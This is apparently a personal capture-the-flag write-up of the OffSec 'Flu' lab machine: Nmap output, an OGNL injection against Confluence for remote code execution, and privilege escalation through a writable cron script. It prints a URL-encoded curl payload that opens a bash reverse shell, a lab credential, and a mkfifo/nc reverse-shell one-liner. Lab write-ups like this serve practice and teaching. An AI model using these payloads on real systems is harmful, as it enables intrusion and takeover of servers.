---
title: "Flu"
date: 2026-03-23
draft: false
description: "OffSec Flu writeup"
tags: ["linux", "oscp"]
categories: ["CTF Writeups"]
showTableOfContents: true
showReadingTime: true
showWordCount: true
---

# Flu

## Overview

- **OS:** Linux
- **IP:** 192.168.197.41
- **Difficulty:** Intermediate
- **Platform:** OffSec
- **OSCP:** Yes
- **Lists:** N/A

### Summary

Easy RCE then PrivESC with cronjob.

## Loot

| Loot |  |
| --- | --- |
| **Category** | **Details** |
| Usernames |  |
| Passwords |  |
| Usernames+Passwords |  |
| Hashes |  |
| Service Versions |  |

## Enumeration

## Nmap

Nmap was my starting point here, and the service/version clues below shaped the next checks.

```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 02:79:64:84:da:12:97:23:77:8a:3a:60:20:96:ee:cf (ECDSA)
|_  256 dd:49:a3:89:d7:57:ca:92:f0:6c:fe:59:a6:24:cc:87 (ED25519)
8090/tcp open  http     Apache Tomcat (language: en)
|_http-trane-info: Problem with XML parsing of /evox/about
| http-title: Log In - Confluence
|_Requested resource was /login.action?os_destination=%2Findex.action&permissionViolation=true
8091/tcp open  jamlink?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 204 No Content
|     Server: Aleph/0.4.6
|     Date: Mon, 23 Mar 2026 12:13:01 GMT
|     Connection: Close
|   GetRequest: 
|     HTTP/1.1 204 No Content
|     Server: Aleph/0.4.6
|     Date: Mon, 23 Mar 2026 12:12:29 GMT
|     Connection: Close
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Access-Control-Allow-Origin: *
|     Access-Control-Max-Age: 31536000
|     Access-Control-Allow-Methods: OPTIONS, GET, PUT, POST
|     Server: Aleph/0.4.6
|     Date: Mon, 23 Mar 2026 12:12:30 GMT
|     Connection: Close
|     content-length: 0
|   Help, Kerberos, LDAPSearchReq, LPDString, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 414 Request-URI Too Long
|     text is empty (possibly HTTP/0.9)
|   RTSPRequest: 
|     HTTP/1.1 200 OK
|     Access-Control-Allow-Origin: *
|     Access-Control-Max-Age: 31536000
|     Access-Control-Allow-Methods: OPTIONS, GET, PUT, POST
|     Server: Aleph/0.4.6
|     Date: Mon, 23 Mar 2026 12:12:30 GMT
|     Connection: Keep-Alive
|     content-length: 0
|   SIPOptions: 
|     HTTP/1.1 200 OK
|     Access-Control-Allow-Origin: *
|     Access-Control-Max-Age: 31536000
|     Access-Control-Allow-Methods: OPTIONS, GET, PUT, POST
|     Server: Aleph/0.4.6
|     Date: Mon, 23 Mar 2026 12:13:07 GMT
|     Connection: Keep-Alive
|_    content-length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerpri
```

{{< figure src="image 784.png" >}}

## Dirbusting

```

```

## Port 8090

Web behavior was the main signal here, so I traced each response change before exploitation.

{{< figure src="image 785.png" >}}

{{< figure src="image 786.png" >}}

## Exploitation

Once the primitive was confirmed, I converted it into a stable foothold and chained it forward.

{{< figure src="image 787.png" >}}

Lets send this

```
curl -v http://192.168.197.41:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.159/4444%200%3E%261%27%29.start%28%29%22%29%7D/
```

{{< figure src="image 788.png" >}}

{{< figure src="image 789.png" >}}

## PrivESC

{{< figure src="image 790.png" >}}

confluence ; HolingOn12

/opt/atlassian/confluence/conf/server.xml

{{< figure src="image 791.png" >}}

not gettting anywhere w this lets check the crontab

{{< figure src="image 792.png" >}}

we know there is a cronjob running

lets get psypy on and check it out

{{< figure src="image 793.png" >}}

we notice this running with pspy every minute

{{< figure src="image 794.png" >}}

hmm so its running [log-backup.sh](http://log-backup.sh) 

and then doing the whole tar thing

lets call it a day with this

```
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.240 3306 >/tmp/f' > log-backup.sh
```
